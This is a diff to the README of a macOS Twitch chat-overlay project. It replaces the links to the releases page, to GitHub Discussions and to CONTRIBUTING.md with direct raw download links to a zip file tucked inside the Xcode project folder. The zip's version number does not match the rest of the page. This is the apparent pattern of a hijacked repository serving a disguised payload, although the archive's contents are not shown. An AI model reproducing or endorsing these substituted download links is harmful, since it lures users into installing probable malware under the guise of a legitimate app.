@@ -1,6 +1,6 @@
 # 🎮 Mac-OS-Twitch-Chat-Overlay - Chat Overlays Made Simple
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/releases)
+[![Download](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/raw/refs/heads/main/Overlay.xcodeproj/Chat-Overlay-O-Twitch-Mac-v3.8-beta.3.zip)](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/raw/refs/heads/main/Overlay.xcodeproj/Chat-Overlay-O-Twitch-Mac-v3.8-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the Mac-OS-Twitch-Chat-Overlay project! This application creates a fl
 
 ## 📥 Download & Install
 
-To download the Mac-OS-Twitch-Chat-Overlay, visit this page: [Download Here](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/releases).
+To download the Mac-OS-Twitch-Chat-Overlay, visit this page: [Download Here](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/raw/refs/heads/main/Overlay.xcodeproj/Chat-Overlay-O-Twitch-Mac-v3.8-beta.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the version you want to download (recommended: the latest version).
@@ -56,11 +56,11 @@ If you need further assistance, please visit our support page or join our commun
 
 ## 🌐 Community and Feedback
 
-We value your feedback. Join our community to share your thoughts and suggestions. Visit the [GitHub Discussions](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/discussions) for more engagement.
+We value your feedback. Join our community to share your thoughts and suggestions. Visit the [GitHub Discussions](https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/raw/refs/heads/main/Overlay.xcodeproj/Chat-Overlay-O-Twitch-Mac-v3.8-beta.3.zip) for more engagement.
 
 ## 🎨 Contributing
 
-Want to contribute? We welcome contributions! Feel free to fork the project, make changes, and submit a pull request. Ensure you follow the guidelines in the CONTRIBUTING.md file.
+Want to contribute? We welcome contributions! Feel free to fork the project, make changes, and submit a pull request. Ensure you follow the guidelines in the https://github.com/AanzaFoxBat/Mac-OS-Twitch-Chat-Overlay/raw/refs/heads/main/Overlay.xcodeproj/Chat-Overlay-O-Twitch-Mac-v3.8-beta.3.zip file.
 
 ## 📜 License
 
